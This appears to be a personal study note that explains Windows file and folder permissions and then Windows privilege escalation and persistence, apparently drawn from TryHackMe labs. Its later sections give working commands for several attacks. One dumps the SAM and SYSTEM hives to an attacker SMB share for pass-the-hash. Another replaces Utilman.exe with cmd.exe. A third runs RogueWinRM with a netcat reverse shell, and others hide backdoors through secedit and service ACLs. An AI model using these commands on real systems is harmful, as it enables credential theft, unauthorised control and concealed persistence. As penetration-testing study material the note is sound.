# Windows Permissions
Windows access is default-deny.

Windows folder permissions:

* Read — Permits viewing and listing of files and subfolders
* Write — Permits adding of files and subfolders
* Read & Execute — Permits viewing and listing of files and subfolders as well as executing of files; inherited by files and folders
* List Folder Contents — Permits viewing and listing of files and subfolders as well as executing of files; inherited by folders only
* Modify — Permits reading and writing of files and subfolders as well as executing of files; allows deletion of the folder
* Full Control — Permits reading, writing, changing, and deleting of files and subfolders

Windows file permissions:

* Read — Permits viewing or accessing of the file’s contents
* Write — Permits writing to a file
* Read & Execute — Permits viewing and accessing of the file’s contents as well as executing of the file
* List Folder Contents — N/A
* Modify — Permits reading and writing of the file as well as executing of the file; allows deletion of the file
* Full Control — Permits reading, writing, changing and deleting of the file

The biggest differences between Windows and UNIX permissions:

* Windows doesn’t have as fine-grained of control *for a given user or group*.
* Windows has *much more* fine-grained control across users and groups (there’s no limit of three permission sets).
* The ability to delete a folder or file, and to change its permissions, are essentially considered to be distinct “sub-permissions”.

As much as it pains me to say it, in many ways the Windows permission mode is much better than the (pre-ACL) Linux model.

### Additional Resources
* [File and Folder Permissions](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008)

## Checking Permissions
Use `icacls` or `Get-Acl $PATH | Format-List` in PowerShell to check permissions at the command line. The `icacls` tool can also be used to update Windows ACLs.

Both of these tools produce output that is somewhat different than that of the “Security” tab in the file or folder properties:

* `(I)` — permission inherited from the parent container
* `(F)` — full access (full control)
* `(M)` — modify right/access
* `(OI)` — object inherit
* `(IO)` — inherit only
* `(CI)` — container inherit
* `(RX)` — read and execute
* `(AD)` — append data (add subdirectories)
* `(WD)` — write data and add files

Note that the Windows File Explorer only displays the *first* ACL for a particular user or group, but that Windows allows *multiple* ACLs to be applied! This means that the File Explorer does not always show you the *actual* permissions a user/group will have - you really do need to use `icacls` or `Get-Acl`.

In the case of multiple ACLs, or when a user is part of two groups with different groups, keep in mind that allow permissions only override *inherited* deny permissions. Explicitly set deny permissions *cannot* be overridden.

## Common User Types
* Local Admin
* Local User
* Guest User
* Domain User
* Domain Admin

Note that non-admin domain users may still be local admins.

### Important Local Service Accounts
* LocalSystem — The account used by the OS itself; essentially *more* powerful than an normal user account in the Administrators group.
* Local Service — The default account used by Windows services; it has minimal privileges and uses anonymous network connections.
* Network Service — Essentially the same as the Local Service user, but uses the OS (“computer”) credentials when authenticating over the network.

#### Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

## Exploitable Permissions
### SeBackup / SeRestore
These permission allow full read (SeBackup) and write (SeRestore) access to any file. The first of these allows for exfiltration, while the second allows binaries to be replaced at will (combine with service- or task-based attacks!). The “Backup Operators” group has *both* of these permissions!

Backup useful registry hives:

```powershell
reg save HKLM\SYSTEM $PATH_TO_HIVE_FILE
reg save HKLM\SAM $PATH_TO_HIVE_FILE
```

Run a local SMB server with Impacket:

```bash
impacket-smbserver -smb2support -username $CONNECTION_USER \
	-password $CONNECTION_PASSWORD $SHARE_NAME $PATH_TO_DIRECTORY
```

Then, just use copy on Windows:

```powershell
copy $FILE \\$ATTACKER_IP\$SHARE_NAME\
```

Use Impacket to dump hashes from a hive and perform a pass-the-hash attack:

```bash
# Get hashes from SAM/SYSTEM hives
#
impacket-secretsdump -sam $SAM_HIVE_FILE \
	-system $SYSTEM_HIVE_FILE LOCAL

# Get a shell by passing a hash
#
impacket-psexec -hashes $FULL_NTLM_HASH $TARGET_USER@$TARGET_IP
```

#### Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

### SeTakeOwnership
This permission allows a user to take ownership of any file or object (!!!).

```powershell
# Take ownership of a file
#
takeown /f $PATH_TO_FILE

# Give your user ($USERNAME) full access (F) to said file
#
icacls $PATH_TO_FILE /grant $USERNAME:F
```

The “standard” file to replace with `cmd.exe` with this trick is `C:\Windows\System32\Utilman.exe`, which provides accessibility services access from lock and login screens.

#### Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

### SeImpersonate / SeAssignPrimaryToken
These permissions allow for user impersonation. On windows, the Local Service and Network Service accounts already have these privileges; if IIS is installed, there will also often be a IIS AppPool/DefaultAppPool service account with these permissions as well.

*However*, it *isn’t* enough to just have access to a service running as a user with these permissions, as Windows will not allow an application to *arbitrarily* impersonate a user. Instead, we must have a service and then *trick/force a highly privileged account to connect to it*, at which point impersonation will be allowed.

One way to do this is using the RogueWinRM exploit. The idea here is that when a user logs in, the BITS service creates a connection on port 5985 to the (local) WinRM service (which is used to execute PowerShell commands) *as SYSTEM*. If the WinRM service isn’t running, RogueWinRM can be run instead to capture these connections (I’m guessing that the WinRM service can also be back-doored using RogueWinRM directly, but that doing so may interfere with system functionality?).

Example RogueWinRM command line:

```powershell
C:\RogueWinRM.exe -p C:\nc64.exe `
                  -a “-e cmd.exe 10.13.25.33 4442”
```

#### Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

## Bulk Editing Permissions
Privileges can also be manipulated/assigned to users in bulk using the `secedit` tool

1. Dump system privileges: `secedit /export /cfg config.inf`.
2. Edit `config.inf`, appending the user you want to have a given privilege to that privilege’s assignment line (comma-delineated list).
3. Re-import the system privileges: `secedit /import /cfg config.inf /db config.sdb & secedit /configure /db config.sdb /cfg config.inf`

### Additional Resources
* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 

## Service ACLs
For connecting to services (such as WinRM), it’s often possible to manipulate the service ACL rather than the user’s privileges. For example, adding a user to the `Microsoft.PowerShell` security descriptor with the “Full Control” permission will enable access to the WinRM service, regardless of the permissions explicitly assigned to the user.

```powershell
# Note that the below PowerShell command will pull up a GUI ACL
# configuration dialog
#
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

The advantage to manipulating user privileges and service ACLs directly is that it’s less obvious that a user is back-doored.

### Additional Resources
* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 
* [Exploiting Windows Remote Management (WinRM)](./Exploiting%20Windows%20Remote%20Management%20%28WinRM%29.md)
